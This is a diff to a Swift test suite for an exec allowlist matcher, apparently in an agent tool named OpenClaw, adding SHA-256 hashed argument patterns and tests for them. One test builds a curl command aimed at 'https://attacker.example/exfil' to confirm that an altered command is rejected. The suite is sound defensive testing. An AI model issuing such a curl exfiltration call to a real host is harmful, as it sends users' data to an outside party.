@@ -1,3 +1,4 @@
+import CryptoKit
 import Foundation
 import Testing
 @testable import OpenClaw
@@ -37,6 +38,15 @@ struct ExecAllowlistTests {
         let data = try Data(contentsOf: fixtureURL)
         let fixture = try JSONDecoder().decode(WrapperResolutionParityFixture.self, from: data)
         return fixture.cases
+    }
+
+    private static func hashedArgPattern(_ argv: [String]) -> String {
+        let arguments = Array(argv.dropFirst())
+        let subject = "\(arguments.count)\0" + arguments
+            .map { "\($0.data(using: .utf8)?.count ?? 0)\0\($0)\0" }
+            .joined()
+        let digest = SHA256.hash(data: Data(subject.utf8))
+        return "sha256:argv:" + digest.map { String(format: "%02x", $0) }.joined()
     }
 
     private static func fixtureURL(filename: String) -> URL {
@@ -174,6 +184,22 @@ struct ExecAllowlistTests {
         #expect(ExecAllowlistMatcher.match(entries: [fallback, restricted], resolution: unsafe)?.id == "fallback")
     }
 
+    @Test func `match ignores legacy generated path only allow always entries`() {
+        let executable = "/usr/bin/python3"
+        let legacyGenerated = ExecAllowlistEntry(pattern: executable, source: "allow-always")
+        let manual = ExecAllowlistEntry(pattern: executable)
+        let resolution = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "python3",
+            cwd: nil,
+            argv: [executable, "unsafe.py"])
+
+        #expect(ExecAllowlistMatcher.match(entries: [legacyGenerated], resolution: resolution) == nil)
+        #expect(ExecAllowlistMatcher.match(entries: [manual], resolution: resolution) != nil)
+    }
+
     @Test func `match enforces generated nul arg patterns including zero args`() {
         let executable = "/usr/bin/printf"
         let zeroArgs = ExecAllowlistEntry(pattern: executable, argPattern: "^\0\0$")
@@ -196,6 +222,57 @@ struct ExecAllowlistTests {
         #expect(ExecAllowlistMatcher.match(entries: [zeroArgs], resolution: base) != nil)
         #expect(ExecAllowlistMatcher.match(entries: [oneArg], resolution: withSpace) != nil)
         #expect(ExecAllowlistMatcher.match(entries: [zeroArgs], resolution: withSpace) == nil)
+    }
+
+    @Test func `match enforces generated hashed arg patterns before regex fallback`() {
+        let executable = "/usr/bin/curl"
+        let approvedArgv = [executable, "https://trusted.example/install.sh"]
+        let entry = ExecAllowlistEntry(
+            pattern: executable,
+            argPattern: Self.hashedArgPattern(approvedArgv))
+        let approved = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "curl",
+            cwd: nil,
+            argv: approvedArgv)
+        let changed = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "curl",
+            cwd: nil,
+            argv: [executable, entry.argPattern ?? "", "https://attacker.example/exfil"])
+
+        #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: approved) != nil)
+        #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: changed) == nil)
+        #expect(entry.argPattern?.contains("trusted.example") == false)
+    }
+
+    @Test func `hashed arg pattern distinguishes zero args from empty args`() {
+        let executable = "/usr/bin/tool"
+        let zeroArgEntry = ExecAllowlistEntry(
+            pattern: executable,
+            argPattern: Self.hashedArgPattern([executable]))
+        let noArgs = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "tool",
+            cwd: nil,
+            argv: [executable])
+        let emptyArgs = ExecCommandResolution(
+            rawExecutable: executable,
+            resolvedPath: executable,
+            resolvedRealPath: executable,
+            executableName: "tool",
+            cwd: nil,
+            argv: [executable, "", ""])
+
+        #expect(zeroArgEntry.argPattern != Self.hashedArgPattern([executable, "", ""]))
+        #expect(ExecAllowlistMatcher.match(entries: [zeroArgEntry], resolution: noArgs) != nil)
+        #expect(ExecAllowlistMatcher.match(entries: [zeroArgEntry], resolution: emptyArgs) == nil)
     }
 
     @Test func `arg pattern does not discard redirect shaped direct argv literal`() {
@@ -933,7 +1010,8 @@ struct ExecAllowlistTests {
             cwd: nil,
             env: ["PATH": "/usr/bin:/bin"])
 
-        #expect(patterns == ["/usr/bin/printf"])
+        #expect(patterns.map(\.pattern) == ["/usr/bin/printf"])
+        #expect(patterns.first?.argPattern?.hasPrefix("sha256:argv:") == true)
     }
 
     @Test func `allow always patterns fail closed for env modified shell wrappers`() {
@@ -959,7 +1037,8 @@ struct ExecAllowlistTests {
             env: ["PATH": "/usr/bin:/bin"],
             rawCommand: "/usr/bin/printf safe_marker")
 
-        #expect(patterns == ["/usr/bin/printf"])
+        #expect(patterns.map(\.pattern) == ["/usr/bin/printf"])
+        #expect(patterns.first?.argPattern == Self.hashedArgPattern(["/usr/bin/printf", "safe_marker"]))
     }
 
     @Test func `allow always never persists broad interpreter grants`() {
